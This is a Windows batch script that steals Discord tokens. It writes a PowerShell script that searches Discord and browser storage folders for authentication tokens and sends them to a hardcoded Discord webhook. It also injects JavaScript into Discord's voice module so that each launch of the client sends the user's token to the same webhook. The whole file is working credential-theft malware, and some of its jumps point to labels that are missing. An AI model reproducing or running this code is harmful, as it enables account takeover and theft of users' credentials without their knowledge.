@echo off
set webhook=https://discord.com/api/webhooks/1110843714886185012/2T_T1eD7kKSgPXKuTj4Hqb0senHqRd9hStVkwsNY9M-53jrWZK8iMAHzn65A4An9AeZX

:check_Permissions
    
goto starti

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )


:starti

::grabbs the token
echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testttttt.ps1
echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo $db_path = @( >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo ) >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testttttt.ps1 
echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo                 } >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo             } >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo         } >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     } >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo $content = "``` " >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo     $content = [string]::Concat($content, "`n", $data) >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo $content = [string]::Concat($content, "``` ") >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testttttt.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testttttt.ps1
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testttttt.ps1

set /a app = 0 
set /a voice = 0
if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
:a
if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
set /a app=%app%+1
if %app% == 10 goto c
goto a
:c
set /a app=0 
set /a voice=%voice%+1 
if %voice% == 99 goto e
goto a
:b 
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js 
if %killdc% == 1 goto d
goto e